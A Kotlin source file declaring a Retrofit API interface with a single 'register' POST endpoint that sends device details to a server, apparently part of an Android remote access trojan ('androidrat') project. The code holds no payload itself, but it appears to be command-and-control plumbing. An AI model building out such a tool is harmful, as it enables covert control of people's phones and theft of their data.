package com.nqmgaming.androidrat.data

import com.nqmgaming.androidrat.data.dto.DeviceDto
import okhttp3.RequestBody
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.http.Body
import retrofit2.http.POST
import retrofit2.http.Streaming

interface ApiService {
    @Streaming
    @POST("register")
    fun register(@Body deviceDto: DeviceDto): Call<ResponseBody>
}